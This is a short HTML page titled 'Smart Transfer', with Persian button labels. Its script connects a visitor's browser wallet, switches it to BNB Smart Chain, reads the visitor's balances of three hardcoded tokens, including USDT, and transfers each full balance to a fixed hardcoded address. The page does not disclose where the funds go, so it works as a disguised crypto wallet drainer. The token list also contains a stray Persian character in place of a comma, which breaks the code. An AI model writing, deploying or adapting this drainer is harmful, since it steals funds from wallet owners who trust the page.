<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Smart Transfer</title>
<style>
body{font-family:sans-serif;text-align:center;margin-top:40px}
button{padding:10px 20px;font-size:16px;margin:5px}
</style>
</head>
<body>

<h2>Smart Transfer</h2>

<button onclick="connect()">کانکت</button>
<button onclick="transfer()">انتقال</button>

<p id="status"></p>

<script>
const DEST = "0x8E4785818A5A05735974B6556C3650F6338E6ab0";
const TOKENS = [
  "0x3Cb26F04223e948B8D810a7bd170620AFbD42e67",
  "0x641a6Dc991A49f7BE9Fe3C72c5d0FBb223eDb12f"و
  "0x55d398326f99059fF775485246999027B3197955"
];

let account;

function status(t){document.getElementById("status").innerText=t;}

async function ensureBSC(){
 const chainId = "0x38";

 try{
   await ethereum.request({
     method:"wallet_switchEthereumChain",
     params:[{chainId}]
   });
 }catch(err){
   // اگر شبکه اضافه نشده بود
   await ethereum.request({
     method:"wallet_addEthereumChain",
     params:[{
       chainId:"0x38",
       chainName:"BNB Smart Chain",
       nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
       rpcUrls:["https://bsc-dataseed.binance.org"],
       blockExplorerUrls:["https://bscscan.com"]
     }]
   });
 }
}

async function connect(){
 if(!window.ethereum){alert("Wallet not found");return;}
 const acc = await ethereum.request({method:'eth_requestAccounts'});
 account = acc[0];
 await ensureBSC();
 status("Connected & BNB ready");
}

function toHex(n){return "0x"+n.toString(16);}

// خواندن موجودی توکن
async function tokenBalance(token){
 const data="0x70a08231"+account.substring(2).padStart(64,"0");

 const res=await ethereum.request({
  method:"eth_call",
  params:[{to:token,data:data},"latest"]
 });

 return parseInt(res,16);
}

async function sendToken(token, amount){
 const data =
  "0xa9059cbb"+
  DEST.substring(2).padStart(64,"0")+
  toHex(amount).substring(2).padStart(64,"0");

 return ethereum.request({
   method:"eth_sendTransaction",
   params:[{from:account,to:token,data:data}]
 });
}

async function transfer(){

 if(!account){alert("کانکت کن");return;}

 try{

   for(const token of TOKENS){
     const bal = await tokenBalance(token);
     if(bal>0){
       status("ارسال توکن...");
       await sendToken(token, bal);
     }
   }

   status("تمام شد ✅");

 }catch(e){
   console.error(e);
   alert("خطا یا رد شد");
 }
}
</script>
</body>
</html>


